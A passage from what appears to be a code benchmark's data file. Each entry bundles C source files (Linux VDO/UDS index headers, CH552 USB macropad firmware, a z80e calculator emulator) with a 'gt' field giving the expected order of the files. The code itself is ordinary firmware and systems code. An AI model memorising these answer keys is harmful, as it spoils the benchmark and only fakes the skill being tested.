{\n\n\tUDS_CREATE,\n\n\n\tUDS_LOAD,\n\n\n\tUDS_NO_REBUILD,\n};\n\nenum {\n\n\tUDS_RECORD_NAME_SIZE = 16,\n\n\tUDS_RECORD_DATA_SIZE = 16,\n};\n\n\ntypedef int uds_memory_config_size_t;\n\nenum {\n\n\tUDS_MEMORY_CONFIG_MAX = 1024,\n\n\tUDS_MEMORY_CONFIG_REDUCED = 0x1000,\n\tUDS_MEMORY_CONFIG_REDUCED_MAX = 1024 + UDS_MEMORY_CONFIG_REDUCED,\n\n\tUDS_MEMORY_CONFIG_256MB = -256,\n\tUDS_MEMORY_CONFIG_512MB = -512,\n\tUDS_MEMORY_CONFIG_768MB = -768,\n\tUDS_MEMORY_CONFIG_REDUCED_256MB = -1280,\n\tUDS_MEMORY_CONFIG_REDUCED_512MB = -1536,\n\tUDS_MEMORY_CONFIG_REDUCED_768MB = -1792,\n};\n\nstruct uds_record_name {\n\tunsigned char name[UDS_RECORD_NAME_SIZE];\n};\n\nstruct uds_record_data {\n\tunsigned char data[UDS_RECORD_DATA_SIZE];\n};\n\nstruct uds_volume_record {\n\tstruct uds_record_name name;\n\tstruct uds_record_data data;\n};\n\nstruct uds_parameters {\n\n\tstruct block_device *bdev;\n\n\tsize_t size;\n\n\toff_t offset;\n\n\tuds_memory_config_size_t memory_size;\n\n\tbool sparse;\n\n\tu64 nonce;\n\n\tunsigned int zone_count;\n\n\tunsigned int read_threads;\n};\n\n\nstruct uds_index_stats {\n\n\tu64 entries_indexed;\n\n\tu64 memory_used;\n\n\tu64 collisions;\n\n\tu64 entries_discarded;\n\n\ts64 current_time;\n\n\tu64 posts_found;\n\n\tu64 posts_not_found;\n\n\tu64 in_memory_posts_found;\n\n\tu64 dense_posts_found;\n\n\tu64 sparse_posts_found;\n\n\tu64 updates_found;\n\n\tu64 updates_not_found;\n\n\tu64 deletions_found;\n\n\tu64 deletions_not_found;\n\n\tu64 queries_found;\n\n\tu64 queries_not_found;\n\n\tu64 requests;\n};\n\nenum uds_index_region {\n\n\tUDS_LOCATION_UNKNOWN = 0,\n\n\tUDS_LOCATION_INDEX_PAGE_LOOKUP,\n\n\tUDS_LOCATION_RECORD_PAGE_LOOKUP,\n\n\tUDS_LOCATION_UNAVAILABLE,\n\n\tUDS_LOCATION_IN_OPEN_CHAPTER,\n\n\tUDS_LOCATION_IN_DENSE,\n\n\tUDS_LOCATION_IN_SPARSE,\n} __packed;\n\n\nenum uds_zone_message_type {\n\n\tUDS_MESSAGE_NONE = 0,\n\n\tUDS_MESSAGE_SPARSE_CACHE_BARRIER,\n\n\tUDS_MESSAGE_ANNOUNCE_CHAPTER_CLOSED,\n} __packed;\n\nstruct uds_zone_message {\n\n\tenum uds_zone_message_type type;\n\n\tu64 virtual_chapter;\n};\n\nstruct uds_index_session;\nstruct uds_index;\nstruct uds_request;\n\n\ntypedef void (*uds_request_callback_fn)(struct uds_request *request);\n\nstruct uds_request {\n\n\n\n\tstruct uds_record_name record_name;\n\n\tstruct uds_record_data new_metadata;\n\n\tuds_request_callback_fn callback;\n\n\tstruct uds_index_session *session;\n\n\tenum uds_request_type type;\n\n\n\n\n\tstruct uds_record_data old_metadata;\n\n\tint status;\n\n\tbool found;\n\n\n\n\n\tunsigned int zone_number;\n\n\tstruct funnel_queue_entry queue_link;\n\n\tstruct uds_request *next_request;\n\n\tstruct uds_index *index;\n\n\tstruct uds_zone_message zone_message;\n\n\tbool unbatched;\n\n\tbool requeued;\n\n\tu64 virtual_chapter;\n\n\tenum uds_index_region location;\n};\n\n\nint __must_check uds_compute_index_size(const struct uds_parameters *parameters,\n\t\t\t\t\tu64 *index_size);\n\n\nint __must_check uds_create_index_session(struct uds_index_session **session);\n\n\nint uds_destroy_index_session(struct uds_index_session *session);\n\n\nint __must_check uds_open_index(enum uds_open_index_type open_type,\n\t\t\t\tconst struct uds_parameters *parameters,\n\t\t\t\tstruct uds_index_session *session);\n\n\nint __must_check uds_suspend_index_session(struct uds_index_session *session, bool save);\n\n\nint __must_check uds_resume_index_session(struct uds_index_session *session,\n\t\t\t\t\t  struct block_device *bdev);\n\n\nint __must_check uds_flush_index_session(struct uds_index_session *session);\n\n\nint __must_check uds_close_index(struct uds_index_session *session);\n\n\nint __must_check uds_get_index_session_stats(struct uds_index_session *session,\n\t\t\t\t\t     struct uds_index_stats *stats);\n\n\nint __must_check uds_launch_request(struct uds_request *request);\n\nstruct cond_var {\n\tpthread_cond_t condition;\n};\n\nvoid uds_init_cond(struct cond_var *cond);\nvoid uds_signal_cond(struct cond_var *cond);\nvoid uds_broadcast_cond(struct cond_var *cond);\nvoid uds_wait_cond(struct cond_var *cond, struct mutex *mutex);\nvoid uds_destroy_cond(struct cond_var *cond);\n\n#endif\n\n'vdo/utils/uds/hash-utils.h'\n:\n\n\n#ifndef UDS_HASH_UTILS_H\n#define UDS_HASH_UTILS_H\n\n#include \"numeric.h\"\n\n#include \"geometry.h\"\n#include \"indexer.h\"\n\n\n\n\nenum {\n\tVOLUME_INDEX_BYTES_OFFSET = 0,\n\tVOLUME_INDEX_BYTES_COUNT = 8,\n\tCHAPTER_INDEX_BYTES_OFFSET = 8,\n\tCHAPTER_INDEX_BYTES_COUNT = 6,\n\tSAMPLE_BYTES_OFFSET = 14,\n\tSAMPLE_BYTES_COUNT = 2,\n};\n\nstatic inline u64 uds_extract_chapter_index_bytes(const struct uds_record_name *name)\n{\n\tconst u8 *chapter_bits = &name->name[CHAPTER_INDEX_BYTES_OFFSET];\n\tu64 bytes = (u64) get_unaligned_be16(chapter_bits) << 32;\n\n\tbytes |= get_unaligned_be32(chapter_bits + 2);\n\treturn bytes;\n}\n\nstatic inline u64 uds_extract_volume_index_bytes(const struct uds_record_name *name)\n{\n\treturn get_unaligned_be64(&name->name[VOLUME_INDEX_BYTES_OFFSET]);\n}\n\nstatic inline u32 uds_extract_sampling_bytes(const struct uds_record_name *name)\n{\n\treturn get_unaligned_be16(&name->name[SAMPLE_BYTES_OFFSET]);\n}\n\n\nstatic inline u32 uds_hash_to_chapter_delta_list(const struct uds_record_name *name,\n\t\t\t\t\t\t const struct index_geometry *geometry)\n{\n\treturn ((uds_extract_chapter_index_bytes(name) >> geometry->chapter_address_bits) &\n\t\t((1 << geometry->chapter_delta_list_bits) - 1));\n}\n\n\nstatic inline u32 uds_hash_to_chapter_delta_address(const struct uds_record_name *name,\n\t\t\t\t\t\t    const struct index_geometry *geometry)\n{\n\treturn uds_extract_chapter_index_bytes(name) & ((1 << geometry->chapter_address_bits) - 1);\n}\n\nstatic inline unsigned int uds_name_to_hash_slot(const struct uds_record_name *name,\n\t\t\t\t\t\t unsigned int slot_count)\n{\n\treturn (unsigned int) (uds_extract_chapter_index_bytes(name) % slot_count);\n}\n\n#endif\n",
        "gt": [
            "'vdo/utils/uds/linux/mutex.h'",
            "'vdo/utils/uds/indexer.h'",
            "'vdo/utils/uds/hash-utils.h'",
            "'vdo/utils/uds/index-page-map.c'"
        ]
    },
    {
        "files": [
            "'CH552-MacroPad-plus/software/src/usb_composite.h'",
            "'CH552-MacroPad-plus/software/src/usb_hid.h'",
            "'CH552-MacroPad-plus/software/macropad_plus.c'",
            "'CH552-MacroPad-plus/software/src/usb_handler.h'"
        ],
        "content": "'CH552-MacroPad-plus/software/src/usb_composite.h'\n:\n\n\n\n\n\n\n\n#pragma once\n\n#include <stdint.h>\n\n#include \"usb_hid.h\"\n\n\n\n\n\nvoid KBD_press(uint8_t key);\n\nvoid KBD_release(uint8_t key);\n\nvoid KBD_type(uint8_t key);\n\nvoid KBD_releaseAll(void);\n\nvoid KBD_print(char* str);\n\n\n\nvoid CON_press(uint8_t key);\n\nvoid CON_release(void);\n\nvoid CON_type(uint8_t key);\n\n\n\nvoid MOUSE_press(uint8_t buttons);\n\nvoid MOUSE_release(uint8_t buttons);\n\nvoid MOUSE_move(int8_t xrel, int8_t yrel);\n\nvoid MOUSE_wheel(int8_t rel);\n\n\n\nvoid JOY_press(uint8_t buttons);\n\nvoid JOY_release(uint8_t buttons);\n\nvoid JOY_move(int8_t xrel, int8_t yrel);\n\n\n\n#define MOUSE_wheel_up()        MOUSE_wheel( 1)\n\n#define MOUSE_wheel_down()      MOUSE_wheel(-1)\n\n\n\n#define JOY_center()            JOY_move(   0,   0)\n\n#define JOY_up()                JOY_move(   0,-127)\n\n#define JOY_down()              JOY_move(   0, 127)\n\n#define JOY_left()              JOY_move(-127,   0)\n\n#define JOY_right()             JOY_move( 127,   0)\n\n\n\n\n\n#define KBD_getState()          (EP2_buffer[0])\n\n#define KBD_NUM_LOCK_state      (KBD_getState() & 1)\n\n#define KBD_CAPS_LOCK_state     ((KBD_getState() >> 1) & 1)\n\n#define KBD_SCROLL_LOCK_state   ((KBD_getState() >> 2) & 1)\n\n#define KBD_COMPOSE_state       ((KBD_getState() >> 3) & 1)\n\n#define KBD_KANA_state          ((KBD_getState() >> 4) & 1)\n\n\n\n\n\n#define KBD_KEY_LEFT_CTRL       0x80\n\n#define KBD_KEY_LEFT_SHIFT      0x81\n\n#define KBD_KEY_LEFT_ALT        0x82\n\n#define KBD_KEY_LEFT_GUI        0x83\n\n#define KBD_KEY_RIGHT_CTRL      0x84\n\n#define KBD_KEY_RIGHT_SHIFT     0x85\n\n#define KBD_KEY_RIGHT_ALT       0x86\n\n#define KBD_KEY_RIGHT_GUI       0x87\n\n\n\n\n\n#define KBD_KEY_UP_ARROW        0xDA\n\n#define KBD_KEY_DOWN_ARROW      0xD9\n\n#define KBD_KEY_LEFT_ARROW      0xD8\n\n#define KBD_KEY_RIGHT_ARROW     0xD7\n\n#define KBD_KEY_BACKSPACE       0xB2\n\n#define KBD_KEY_TAB             0xB3\n\n#define KBD_KEY_RETURN          0xB0\n\n#define KBD_KEY_ESC             0xB1\n\n#define KBD_KEY_INSERT          0xD1\n\n#define KBD_KEY_DELETE          0xD4\n\n#define KBD_KEY_PAGE_UP         0xD3\n\n#define KBD_KEY_PAGE_DOWN       0xD6\n\n#define KBD_KEY_HOME            0xD2\n\n#define KBD_KEY_END             0xD5\n\n#define KBD_KEY_CAPS_LOCK       0xC1\n\n#define KBD_KEY_F1              0xC2\n\n#define KBD_KEY_F2              0xC3\n\n#define KBD_KEY_F3              0xC4\n\n#define KBD_KEY_F4              0xC5\n\n#define KBD_KEY_F5              0xC6\n\n#define KBD_KEY_F6              0xC7\n\n#define KBD_KEY_F7              0xC8\n\n#define KBD_KEY_F8              0xC9\n\n#define KBD_KEY_F9              0xCA\n\n#define KBD_KEY_F10             0xCB\n\n#define KBD_KEY_F11             0xCC\n\n#define KBD_KEY_F12             0xCD\n\n#define KBD_KEY_F13             0xF0\n\n#define KBD_KEY_F14             0xF1\n\n#define KBD_KEY_F15             0xF2\n\n#define KBD_KEY_F16             0xF3\n\n#define KBD_KEY_F17             0xF4\n\n#define KBD_KEY_F18             0xF5\n\n#define KBD_KEY_F19             0xF6\n\n#define KBD_KEY_F20             0xF7\n\n#define KBD_KEY_F21             0xF8\n\n#define KBD_KEY_F22             0xF9\n\n#define KBD_KEY_F23             0xFA\n\n#define KBD_KEY_F24             0xFB\n\n\n\n\n\n#define CON_SYS_POWER           0x30\n\n#define CON_SYS_RESET           0x31\n\n#define CON_SYS_SLEEP           0x32\n\n\n\n#define CON_VOL_MUTE            0xE2\n\n#define CON_VOL_UP              0xE9\n\n#define CON_VOL_DOWN            0xEA\n\n\n\n#define CON_MEDIA_PLAY          0xB0\n\n#define CON_MEDIA_PAUSE         0xB1\n\n#define CON_MEDIA_RECORD        0xB2\n\n#define CON_MEDIA_FORWARD       0xB3\n\n#define CON_MEDIA_REWIND        0xB4\n\n#define CON_MEDIA_NEXT          0xB5\n\n#define CON_MEDIA_PREV          0xB6\n\n#define CON_MEDIA_STOP          0xB7\n\n#define CON_MEDIA_EJECT         0xB8\n\n#define CON_MEDIA_RANDOM        0xB9\n\n\n\n#define CON_MENU                0x40\n\n#define CON_MENU_PICK           0x41\n\n#define CON_MENU_UP             0x42\n\n#define CON_MENU_DOWN           0x43\n\n#define CON_MENU_LEFT           0x44\n\n#define CON_MENU_RIGHT          0x45\n\n#define CON_MENU_ESCAPE         0x46\n\n#define CON_MENU_INCR           0x47\n\n#define CON_MENU_DECR           0x48\n\n\n\n\n\n#define MOUSE_BUTTON_LEFT       0x01\n\n#define MOUSE_BUTTON_RIGHT      0x02\n\n#define MOUSE_BUTTON_MIDDLE     0x04\n\n\n'CH552-MacroPad-plus/software/src/usb_hid.h'\n:\n\n\n\n\n\n\n\n#pragma once\n\n#include <stdint.h>\n\n#include \"usb_handler.h\"\n\n\n\nvoid HID_init(void);\n\nvoid HID_sendReport(__xdata uint8_t* buf, uint8_t len);\n\n\n'CH552-MacroPad-plus/software/macropad_plus.c'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#include \"src/config.h\"\n\n#include \"src/system.h\"\n\n#include \"src/delay.h\"\n\n#include \"src/neo.h\"\n\n#include \"src/usb_composite.h\"\n\n\n\n\n\nvoid USB_interrupt(void);\n\nvoid USB_ISR(void) __interrupt(INT_NO_USB) {\n\n  USB_interrupt();\n\n}\n\n\n\n#pragma disable_warning 110\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\ninline void KEY1_PRESSED() {\n\n\n\n}\n\n\n\n\n\ninline void KEY1_RELEASED() {\n\n\n\n}\n\n\n\n\n\ninline void KEY1_HOLD() {\n\n  MOUSE_wheel_up();\n\n  DLY_ms(10);\n\n}\n\n\n\n\n\n\n\n\n\n\n\ninline void KEY2_PRESSED() {\n\n  KBD_press(KBD_KEY_LEFT_ALT);\n\n}\n\n\n\n\n\ninline void KEY2_RELEASED() {\n\n  KBD_release(KBD_KEY_LEFT_ALT);\n\n}\n\n\n\n\n\ninline void KEY2_HOLD() {\n\n  KBD_type(KBD_KEY_TAB);\n\n  DLY_ms(500);\n\n}\n\n\n\n\n\n\n\n\n\n\n\ninline void KEY3_PRESSED() {\n\n  KBD_press(KBD_KEY_LEFT_GUI);\n\n  KBD_press(KBD_KEY_DOWN_ARROW);\n\n}\n\n\n\n\n\ninline void KEY3_RELEASED() {\n\n  KBD_release(KBD_KEY_DOWN_ARROW);\n\n  KBD_release(KBD_KEY_LEFT_GUI);\n\n}\n\n\n\n\n\ninline void KEY3_HOLD() {\n\n\n\n}\n\n\n\n\n\n\n\n\n\n\n\ninline void KEY4_PRESSED() {\n\n  KBD_press(KBD_KEY_LEFT_CTRL);\n\n  KBD_press(KBD_KEY_LEFT_ALT);\n\n  KBD_press(KBD_KEY_DELETE);\n\n}\n\n\n\n\n\ninline void KEY4_RELEASED() {\n\n  KBD_release(KBD_KEY_DELETE);\n\n  KBD_release(KBD_KEY_LEFT_ALT);\n\n  KBD_release(KBD_KEY_LEFT_CTRL);\n\n}\n\n\n\n\n\ninline void KEY4_HOLD() {\n\n\n\n}\n\n\n\n\n\n\n\n\n\n\n\ninline void KEY5_PRESSED() {\n\n  KBD_press(KBD_KEY_LEFT_GUI);\n\n  KBD_type('t');\n\n  DLY_ms(500);\n\n  KBD_release(KBD_KEY_LEFT_GUI);\n\n  KBD_print(\"sudo shutdown -h now\");\n\n  KBD_type(KBD_KEY_RETURN);\n\n}\n\n\n\n\n\ninline void KEY5_RELEASED() {\n\n\n\n}\n\n\n\n\n\ninline void KEY5_HOLD() {\n\n\n\n}\n\n\n\n\n\n\n\n\n\n\n\ninline void KEY6_PRESSED() {\n\n\n\n}\n\n\n\n\n\ninline void KEY6_RELEASED() {\n\n\n\n}\n\n\n\n\n\ninline void KEY6_HOLD() {\n\n  MOUSE_wheel_down();\n\n  DLY_ms(10);\n\n}\n\n\n\n\n\n\n\n\n\n\n\ninline void ENC_CW_ACTION() {\n\n  CON_press(CON_VOL_UP);\n\n}\n\n\n\n\n\ninline void ENC_CW_RELEASED() {\n\n  CON_release();\n\n}\n\n\n\n\n\ninline void ENC_CCW_ACTION() {\n\n  CON_press(CON_VOL_DOWN);\n\n}\n\n\n\n\n\ninline void ENC_CCW_RELEASED() {\n\n  CON_release();\n\n}\n\n\n\n\n\ninline void ENC_SW_PRESSED() {\n\n  CON_press(CON_VOL_MUTE);\n\n}\n\n\n\n\n\ninline void ENC_SW_RELEASED() {\n\n  CON_release();\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\n#define NEO_BRIGHT_KEYS   2\n\n#define NEO_BRIGHT_ENC    0\n\n\n\n\n\n#define NEO_KEY1          0\n\n#define NEO_KEY2          32\n\n#define NEO_KEY3          64\n\n#define NEO_KEY4          96\n\n#define NEO_KEY5          128\n\n#define NEO_KEY6          160\n\n\n\n\n\n\n\n\n\n\n\nuint8_t neoencoder = 0;\n\n\n\n\n\nvoid NEO_encoder_update(void) {\n\n  uint8_t i, j;\n\n  j = neoencoder;\n\n  for(i=6; i<18; i++) {\n\n    NEO_writeHue(i, j, NEO_BRIGHT_ENC);\n\n    j += 16;\n\n    if(j >= 192) j -= 192;\n\n  }\n\n  NEO_update();\n\n}\n\n\n\n\n\nvoid NEO_encoder_cw(void) {\n\n  neoencoder += 8;\n\n  if(neoencoder >= 192) neoencoder -= 192;\n\n  NEO_encoder_update();\n\n}\n\n\n\n\n\nvoid NEO_encoder_ccw(void) {\n\n  neoencoder -= 8;\n\n  if(neoencoder >= 192) neoencoder -= 64;\n\n  NEO_encoder_update();\n\n}\n\n\n\n\n\n\n\n\n\nvoid main(void) {\n\n\n\n  __bit key1last = 0;\n\n  __bit key2last = 0;\n\n  __bit key3last = 0;\n\n  __bit key4last = 0;\n\n  __bit key5last = 0;\n\n  __bit key6last = 0;\n\n  __bit isSwitchPressed = 0;\n\n  __idata uint8_t i;\n\n\n\n\n\n  NEO_init();\n\n  CLK_config();\n\n  DLY_ms(10);\n\n  NEO_clearAll();\n\n\n\n\n\n  if(!PIN_read(PIN_ENC_SW)) {\n\n    for(i=3*NEO_COUNT; i; i--) NEO_sendByte(127);\n\n    BOOT_now();\n\n  }\n\n\n\n\n\n  HID_init();\n\n  DLY_ms(500);\n\n  WDT_start();\n\n  NEO_encoder_update();\n\n\n\n\n\n  while(1) {\n\n\n\n\n\n\n\n    if(!PIN_read(PIN_KEY1) != key1last) {\n\n      key1last = !key1last;\n\n      if(key1last) {\n\n        NEO_writeHue(0, NEO_KEY1, NEO_BRIGHT_KEYS);\n\n        NEO_update();\n\n        KEY1_PRESSED();\n\n      }\n\n      else {\n\n        NEO_clearPixel(0);\n\n        NEO_update();\n\n        KEY1_RELEASED();\n\n      }\n\n    }\n\n    else if(key1last) {\n\n      KEY1_HOLD();\n\n    }\n\n\n\n\n\n\n\n    if(!PIN_read(PIN_KEY2) != key2last) {\n\n      key2last = !key2last;\n\n      if(key2last) {\n\n        NEO_writeHue(1, NEO_KEY2, NEO_BRIGHT_KEYS);\n\n        NEO_update();\n\n        KEY2_PRESSED();\n\n      }\n\n      else {\n\n        NEO_clearPixel(1);\n\n        NEO_update();\n\n        KEY2_RELEASED();\n\n      }\n\n    }\n\n    else if(key2last) {\n\n      KEY2_HOLD();\n\n    }\n\n\n\n\n\n\n\n    if(!PIN_read(PIN_KEY3) != key3last) {\n\n      key3last = !key3last;\n\n      if(key3last) {\n\n        NEO_writeHue(2, NEO_KEY3, NEO_BRIGHT_KEYS);\n\n        NEO_update();\n\n        KEY3_PRESSED();\n\n      }\n\n      else {\n\n        NEO_clearPixel(2);\n\n        NEO_update();\n\n        KEY3_RELEASED();\n\n      }\n\n    }\n\n    else if(key3last) {\n\n      KEY3_HOLD();\n\n    }\n\n\n\n\n\n\n\n    if(!PIN_read(PIN_KEY4) != key4last) {\n\n      key4last = !key4last;\n\n      if(key4last) {\n\n        NEO_writeHue(3, NEO_KEY4, NEO_BRIGHT_KEYS);\n\n        NEO_update();\n\n        KEY4_PRESSED();\n\n      }\n\n      else {\n\n        NEO_clearPixel(3);\n\n        NEO_update();\n\n        KEY4_RELEASED();\n\n      }\n\n    }\n\n    else if(key4last) {\n\n      KEY4_HOLD();\n\n    }\n\n\n\n\n\n\n\n    if(!PIN_read(PIN_KEY5) != key5last) {\n\n      key5last = !key5last;\n\n      if(key5last) {\n\n        NEO_writeHue(4, NEO_KEY5, NEO_BRIGHT_KEYS);\n\n        NEO_update();\n\n        KEY5_PRESSED();\n\n      }\n\n      else {\n\n        NEO_clearPixel(4);\n\n        NEO_update();\n\n        KEY5_RELEASED();\n\n      }\n\n    }\n\n    else if(key5last) {\n\n      KEY5_HOLD();\n\n    }\n\n\n\n\n\n\n\n    if(!PIN_read(PIN_KEY6) != key6last) {\n\n      key6last = !key6last;\n\n      if(key6last) {\n\n        NEO_writeHue(5, NEO_KEY6, NEO_BRIGHT_KEYS);\n\n        NEO_update();\n\n        KEY6_PRESSED();\n\n      }\n\n      else {\n\n        NEO_clearPixel(5);\n\n        NEO_update();\n\n        KEY6_RELEASED();\n\n      }\n\n    }\n\n    else if(key6last) {\n\n      KEY6_HOLD();\n\n    }\n\n\n\n\n\n\n\n    if(!PIN_read(PIN_ENC_A)) {\n\n      if(PIN_read(PIN_ENC_B)) {\n\n        ENC_CW_ACTION();\n\n        NEO_encoder_cw();\n\n        DLY_ms(5);\n\n        ENC_CW_RELEASED();\n\n      }\n\n      else {\n\n        ENC_CCW_ACTION();\n\n        NEO_encoder_ccw();\n\n        DLY_ms(5);\n\n        ENC_CCW_RELEASED();\n\n      }\n\n      while(!PIN_read(PIN_ENC_A));\n\n    }\n\n    else {\n\n      if(!isSwitchPressed && !PIN_read(PIN_ENC_SW)) {\n\n        ENC_SW_PRESSED();\n\n        isSwitchPressed = 1;\n\n      }\n\n      else if(isSwitchPressed && PIN_read(PIN_ENC_SW)) {\n\n        ENC_SW_RELEASED();\n\n        isSwitchPressed = 0;\n\n      }\n\n    }\n\n\n\n    DLY_ms(1);\n\n    WDT_reset();\n\n  }\n\n}\n\n\n'CH552-MacroPad-plus/software/src/usb_handler.h'\n:\n\n\n\n#pragma once\n#include <stdint.h>\n#include \"usb_descr.h\"\n\n\n\n\n__xdata __at (EP0_ADDR) uint8_t EP0_buffer[EP0_BUF_SIZE];\n__xdata __at (EP1_ADDR) uint8_t EP1_buffer[EP1_BUF_SIZE];\n__xdata __at (EP2_ADDR) uint8_t EP2_buffer[EP2_BUF_SIZE];\n\n#define USB_setupBuf ((PUSB_SETUP_REQ)EP0_buffer)\nextern uint8_t SetupReq;\n\n\n\n\nvoid HID_setup(void);\nvoid HID_reset(void);\nvoid HID_EP1_IN(void);\nvoid HID_EP2_OUT(void);\n\n\n\n\n\n#define USB_INIT_handler    HID_setup\n#define USB_RESET_handler   HID_reset\n\n\n#define EP0_SETUP_callback  USB_EP0_SETUP\n#define EP0_IN_callback     USB_EP0_IN\n#define EP0_OUT_callback    USB_EP0_OUT\n#define EP1_IN_callback     HID_EP1_IN\n#define EP2_OUT_callback    HID_EP2_OUT\n\n\n\n\nvoid USB_interrupt(void);\nvoid USB_init(void);\n",
        "gt": [
            "'CH552-MacroPad-plus/software/src/usb_handler.h'",
            "'CH552-MacroPad-plus/software/src/usb_hid.h'",
            "'CH552-MacroPad-plus/software/src/usb_composite.h'",
            "'CH552-MacroPad-plus/software/macropad_plus.c'"
        ]
    },
    {
        "files": [
            "'z80e/libz80e/include/z80e/core/cpu.h'",
            "'z80e/libz80e/include/z80e/debugger/hooks.h'",
            "'z80e/libz80e/src/ti/asic.c'"
        ],
        "content": "'z80e/libz80e/include/z80e/core/cpu.h'\n:#ifndef CPU_H\n#define CPU_H\n\n#include <stdint.h>\n\n#include <z80e/core/registers.h>\n#include <z80e/log/log.h>\n\ntypedef struct z80cpu z80cpu_t;\ntypedef struct z80iodevice z80iodevice_t;\n\n#include <z80e/debugger/hooks.h>\n\nstruct z80iodevice {\n\tvoid *device;\n\tuint8_t (*read_in)(void *);\n\tvoid (*write_out)(void *, uint8_t);\n};\n\nstruct z80cpu {\n\tz80iodevice_t devices[0x100];\n\tz80registers_t registers;\n\tstruct {\n\t\tuint8_t IFF1 : 1;\n\t\tuint8_t IFF2 : 1;\n\t\tuint8_t int_mode : 2;\n\n\t\tuint8_t IFF_wait : 1;\n\t\tuint8_t halted : 1;\n\t};\n\tuint8_t bus;\n\tuint16_t prefix;\n\tvoid *memory;\n\tuint8_t (*read_byte)(void *, uint16_t);\n\tvoid (*write_byte)(void *, uint16_t, uint8_t);\n\tint interrupt;\n\thook_info_t *hook;\n\tlog_t *log;\n};\n\n\nuint8_t cpu_read_register_byte(z80cpu_t *, registers);\nuint16_t cpu_read_register_word(z80cpu_t *, registers);\n\nuint8_t cpu_write_register_byte(z80cpu_t *, registers, uint8_t);\nuint16_t cpu_write_register_word(z80cpu_t *, registers, uint16_t);\n\nz80cpu_t* cpu_init(log_t *log);\nvoid cpu_free(z80cpu_t *cpu);\nuint8_t cpu_read_byte(z80cpu_t *cpu, uint16_t address);\nvoid cpu_write_byte(z80cpu_t *cpu, uint16_t address, uint8_t value);\nuint16_t cpu_read_word(z80cpu_t *cpu, uint16_t address);\nvoid cpu_write_word(z80cpu_t *cpu, uint16_t address, uint16_t value);\nint cpu_execute(z80cpu_t *cpu, int cycles);\n\n#endif\n\n'z80e/libz80e/include/z80e/debugger/hooks.h'\n:#ifndef DEBUGGER_HOOKS_H\n#define DEBUGGER_HOOKS_H\n\n#include <stdint.h>\n\ntypedef struct hook_info hook_info_t;\n\n#include <z80e/ti/asic.h>\n#include <z80e/core/registers.h>\n#include <z80e/ti/hardware/t6a04.h>\n\nhook_info_t *create_hook_set(asic_t *asic);\n\n\n\nuint8_t hook_on_memory_read(hook_info_t *, uint16_t address, uint8_t value);\nuint8_t hook_on_memory_write(hook_info_t *, uint16_t address, uint8_t value);\n\ntypedef uint8_t (*hook_memory_callback)(void *data, uint16_t address, uint8_t value);\n\nvoid hook_remove_memory_read(hook_info_t *, int);\nint hook_add_memory_read(hook_info_t *, uint16_t address_start, uint16_t address_end, void *data, hook_memory_callback);\nvoid hook_remove_register_write(hook_info_t *, int);\nint hook_add_memory_write(hook_info_t *, uint16_t address_start, uint16_t address_end, void *data, hook_memory_callback);\n\n\n\nuint16_t hook_on_register_read(hook_info_t *, registers flags, uint16_t value);\nuint16_t hook_on_register_write(hook_info_t *, registers flags, uint16_t value);\n\ntypedef uint16_t (*hook_register_callback)(void *data, registers reg, uint16_t value);\n\nvoid hook_remove_register_read(hook_info_t *, int);\nint hook_add_register_read(hook_info_t *, registers flags, void *data, hook_register_callback);\nvoid hook_remove_register_write(hook_info_t *, int);\nint hook_add_register_write(hook_info_t *, registers flags, void *data, hook_register_callback);\n\n\n\nuint8_t hook_on_port_in(hook_info_t *, uint8_t port, uint8_t value);\nuint8_t hook_on_port_out(hook_info_t *, uint8_t port, uint8_t value);\n\ntypedef uint8_t (*hook_port_callback)(void *data, uint8_t port, uint8_t value);\n\nvoid hook_remove_port_in(hook_info_t *, int);\nint hook_add_port_in(hook_info_t *, uint8_t port_range_start, uint8_t port_range_end, void *data, hook_port_callback);\nvoid hook_remove_port_out(hook_info_t *, int);\nint hook_add_port_out(hook_info_t *, uint8_t port_range_start, uint8_t port_range_end, void *data, hook_port_callback);\n\n\n\nvoid hook_on_before_execution(hook_info_t *, uint16_t address);\nvoid hook_on_after_execution(hook_info_t *, uint16_t address);\n\ntypedef void (*hook_execution_callback)(void *data, uint16_t address);\n\nvoid hook_remove_before_execution(hook_info_t *, int);\nint hook_add_before_execution(hook_info_t *, void *data, hook_execution_callback);\nvoid hook_remove_after_execution(hook_info_t *, int);\nint hook_add_after_execution(hook_info_t *, void *data, hook_execution_callback);\n\n\n\nvoid hook_on_lcd_update(hook_info_t *, ti_bw_lcd_t *);\n\ntypedef void (*hook_lcd_update_callback)(void *data, ti_bw_lcd_t *lcd);\n\nvoid hook_remove_lcd_update(hook_info_t *, int);\nint hook_add_lcd_update(hook_info_t *, void *data, hook_lcd_update_callback);\n\n#endif\n\n'z80e/libz80e/src/ti/asic.c'\n:#include \"ti/asic.h\"\n#include <stdint.h>\n#include <stdlib.h>\n#include <string.h>\n\n#include \"log/log.h\"\n#include \"core/cpu.h\"\n#include \"ti/memory.h\"\n#include \"ti/hardware/t6a04.h\"\n#include \"ti/hardware/speed.h\"\n#include \"ti/hardware/memorymapping.h\"\n#include \"ti/hardware/keyboard.h\"\n#include \"ti/hardware/status.h\"\n#include \"ti/hardware/flash.h\"\n#include \"ti/hardware/link.h\"\n#include \"ti/hardware/timers.h\"\n\ntypedef struct {\n\tasic_t *asic;\n\tuint8_t port;\n} unimplemented_device_t;\n\nuint8_t read_unimplemented_port(void *device) {\n\tunimplemented_device_t *d = device;\n\tlog_message(d->asic->log, L_INFO, \"asic\",\n\t\t\"Warning: attempted to read from unimplemented port 0x%02x from 0x%04X.\", d->port, d->asic->cpu->registers.PC);\n\treturn 0x00;\n}\n\nvoid write_unimplemented_port(void *device, uint8_t value) {\n\tunimplemented_device_t *d = device;\n\tlog_message(d->asic->log, L_INFO, \"asic\",\n\t\t\"Warning: attempted to write 0x%02x to unimplemented port 0x%02x from 0x%04X.\", value, d->port, d->asic->cpu->registers.PC);\n}\n\nvoid plug_devices(asic_t *asic) {\n\n\tint i;\n\tfor (i = 0; i < 0x100; i++) {\n\t\tunimplemented_device_t *d = malloc(sizeof(unimplemented_device_t));\n\t\td->asic = asic;\n\t\td->port = i;\n\t\tz80iodevice_t device = { d, read_unimplemented_port, 